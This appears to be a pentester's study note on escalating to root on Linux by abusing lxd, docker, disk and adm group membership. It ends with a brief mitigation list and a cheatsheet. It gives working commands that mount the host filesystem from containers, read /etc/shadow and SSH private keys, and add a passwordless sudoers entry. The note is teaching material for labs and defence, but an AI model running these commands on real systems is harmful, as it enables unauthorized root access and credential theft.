# Linux Privilege Escalation – Privileged Groups

## Overview

Certain Linux groups grant elevated capabilities that can effectively lead to **root compromise** or access to sensitive system data.

When enumerating privilege escalation paths, always check group membership:

```bash
id
groups
```

High-risk groups:

| Group | Risk |
|------|------|
| lxd | root-level filesystem access via containers |
| docker | container escape to host filesystem |
| disk | raw filesystem access |
| adm | read sensitive logs |
| sudo | administrative privileges |
| shadow | read password hashes |
| root | full privilege inheritance |

---

# LXC / LXD Group Abuse

LXD is Ubuntu's container management system, similar to Docker.

Members of the **lxd** group can create privileged containers that mount the host filesystem.

This effectively grants root-level access.

Check membership:

```bash
id
```

Example:

```bash
uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

---

## Exploitation Workflow

Prepare Alpine image:

```bash
unzip alpine.zip
cd 64-bit\ Alpine/
```

Initialize LXD:

```bash
lxd init
```

Use defaults where possible.

---

Import image:

```bash
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

---

Create privileged container:

```bash
lxc init alpine r00t -c security.privileged=true
```

Privileged containers remove UID mapping protections.

---

Mount host filesystem:

```bash
lxc config device add r00t mydev disk \
source=/ \
path=/mnt/root \
recursive=true
```

---

Start container:

```bash
lxc start r00t
```

Execute shell:

```bash
lxc exec r00t /bin/sh
```

---

Access host filesystem:

```bash
cd /mnt/root/root
```

Sensitive targets:

```bash
/mnt/root/etc/shadow
/mnt/root/root/.ssh/id_rsa
/mnt/root/etc/passwd
```

Root access achieved.

---

# Docker Group Abuse

Users in the **docker** group can control containers.

Docker effectively runs as root.

Check membership:

```bash
id
```

Example:

```bash
groups=1001(user),999(docker)
```

---

Mount host filesystem:

```bash
docker run -v /:/mnt -it ubuntu bash
```

Access host:

```bash
cd /mnt/root
```

Retrieve SSH keys:

```bash
cat /mnt/root/.ssh/id_rsa
```

Or modify system:

```bash
echo 'user ALL=(ALL) NOPASSWD:ALL' >> /mnt/etc/sudoers
```

Root compromise achieved.

---

# Disk Group Abuse

Members of the **disk** group can access raw disk devices.

Example devices:

```bash
/dev/sda
/dev/sda1
/dev/nvme0n1
```

This allows reading entire filesystem.

---

Use debugfs:

```bash
debugfs /dev/sda1
```

Read sensitive files:

```bash
cat /etc/shadow
```

Or mount device:

```bash
mount /dev/sda1 /mnt
```

Access:

```bash
/mnt/root
```

---

# ADM Group Abuse

Members of **adm** group can read system logs:

```bash
/var/log/*
```

Logs often contain:

- credentials
- API tokens
- usernames
- internal IP addresses
- cron job details
- command history
- service configurations

Check membership:

```bash
id
```

Example:

```bash
groups=1010(secaudit),4(adm)
```

---

Search logs for credentials:

```bash
grep -Ri password /var/log 2>/dev/null
```

Check authentication logs:

```bash
cat /var/log/auth.log
```

Look for:

```text
sudo usage
ssh logins
cron jobs
backup scripts
```

---

# Identifying Privileged Groups

List groups:

```bash
cat /etc/group
```

Check current memberships:

```bash
id
```

Find group-owned files:

```bash
find / -group docker 2>/dev/null
```

---

# Enumeration Checklist

## Identify current groups

```bash
id
groups
```

---

## Identify high-risk groups

```bash
cat /etc/group
```

---

## Check docker access

```bash
docker ps
```

---

## Check LXD access

```bash
lxc image list
```

---

## Check disk devices

```bash
ls -l /dev/sd*
```

---

## Check log access

```bash
ls -la /var/log
```

---

# Defensive Mitigation

Restrict group membership:

```bash
usermod -G
```

Principle of least privilege:

Only assign groups when absolutely required.

Avoid assigning:

- docker
- lxd
- disk

Audit group membership regularly.

Monitor container activity.

Restrict access to:

```bash
/dev/*
/var/log/*
```

Implement logging alerts for container creation.

---

# Quick Privileged Group Cheatsheet

```bash
id

groups

cat /etc/group

docker run -v /:/mnt -it ubuntu bash

lxc init alpine r00t -c security.privileged=true

debugfs /dev/sda1

grep -Ri password /var/log 2>/dev/null
```

---

# Key Takeaways

- group membership can grant root-equivalent access
- docker group effectively equals root
- lxd allows mounting host filesystem
- disk group allows raw filesystem access
- adm group exposes sensitive operational data
- always enumerate groups early
- container permissions frequently overlooked
- principle of least privilege is critical defence

---

# Tags

#linux
#privilege-escalation
#docker
#lxd
#groups
#post-exploitation
#enumeration
#ctf
#pentesting
#obsidian